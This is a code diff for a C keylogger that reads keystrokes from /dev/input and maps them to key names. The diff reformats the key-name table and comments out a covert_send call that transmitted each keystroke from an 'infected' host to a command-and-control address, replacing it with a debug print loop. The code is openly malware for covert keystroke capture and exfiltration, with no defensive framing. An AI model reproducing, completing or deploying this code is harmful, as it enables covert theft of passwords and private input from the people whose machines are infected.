@@ -20,8 +20,8 @@
 int loop = 1;
 
 const char *keycodes[] = {
-    "RESERVED",
-    "ESC",
+    " <RESERVED> ",
+    " <ESC> ",
     "1",
     "2",
     "3",
@@ -32,10 +32,10 @@ const char *keycodes[] = {
     "8",
     "9",
     "0",
-    "MINUS",
-    "EQUAL",
-    "BACKSPACE",
-    "TAB",
+    " <MINUS> ",
+    " <EQUAL> ",
+    " <BACKSPACE> ",
+    " <TAB> ",
     "Q",
     "W",
     "E",
@@ -46,10 +46,10 @@ const char *keycodes[] = {
     "I",
     "O",
     "P",
-    "LEFTBRACE",
-    "RIGHTBRACE",
-    "ENTER",
-    "LEFTCTRL",
+    " <LEFTBRACE> ",
+    " <RIGHTBRACE> ",
+    " <ENTER> ",
+    " <LEFTCTRL> ",
     "A",
     "S",
     "D",
@@ -59,11 +59,11 @@ const char *keycodes[] = {
     "J",
     "K",
     "L",
-    "SEMICOLON",
-    "APOSTROPHE",
-    "GRAVE",
-    "LEFTSHIFT",
-    "BACKSLASH",
+    " <SEMICOLON> ",
+    " <APOSTROPHE> ",
+    " <GRAVE> ",
+    " <LEFTSHIFT> ",
+    " <BACKSLASH> ",
     "Z",
     "X",
     "C",
@@ -71,14 +71,14 @@ const char *keycodes[] = {
     "B",
     "N",
     "M",
-    "COMMA",
-    "DOT",
-    "SLASH",
-    "RIGHTSHIFT",
-    "KPASTERISK",
-    "LEFTALT",
-    "SPACE",
-    "CAPSLOCK",
+    " <COMMA> ",
+    " <DOT> ",
+    " <SLASH> ",
+    " <RIGHTSHIFT> ",
+    " <KPASTERISK> ",
+    " <LEFTALT> ",
+    " <SPACE> ",
+    " <CAPSLOCK> ",
     "F1",
     "F2",
     "F3",
@@ -89,8 +89,8 @@ const char *keycodes[] = {
     "F8",
     "F9",
     "F10",
-    "NUMLOCK",
-    "SCROLLLOCK"
+    " <NUMLOCK> ",
+    " <SCROLLLOCK> "
 };
 
 /* called for ever file in the /dev/input directory */
@@ -179,12 +179,10 @@ void *keylogger_send(void *args_input) {
     signal(SIGINT, sigint_handler);     //stops the loop if SIGINT is found
     int bytesRead = 0;
     struct input_event events[NUM_EVENTS];
+    int j;
+    char ch[1];
 
     while(loop != 0) {
-        if(loop == 0) {
-            printf("hoow?!\n");
-        }
-
         bytesRead = read(keyboard_fd, events, sizeof(struct input_event) * NUM_EVENTS);
 
         for(int i = 0; i < (bytesRead / (int) sizeof(struct input_event)); ++i) {
@@ -195,7 +193,17 @@ void *keylogger_send(void *args_input) {
                         printf("keylogger: %s\n", keycodes[events[i].code]);
                         //safe_write_all(writeout, keycodes[events[i].code], keyboard);
                         //safe_write_all(writeout, "\n", keyboard);
-                        covert_send(args->infected_ip, args->cnc_ip, KEYLOGGER_PORT, KEYLOGGER_PORT, (unsigned char*) keycodes[events[i].code], 1);
+
+                        j = 0;
+
+                        while(keycodes[events[i].code][j] != '\0') {
+                            ch[0] = keycodes[events[i].code][j];
+                            //printf("DEBUG: %c\n", keycodes[events[i].code][j]);
+                            printf("DEBUG: %c\n", ch[0]);
+
+                            //covert_send(args->infected_ip, args->cnc_ip, KEYLOGGER_PORT, KEYLOGGER_PORT, (unsigned char*) keycodes[events[i].code], 1);
+                            j++;
+                        }
                     } else {
                         //write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                     }
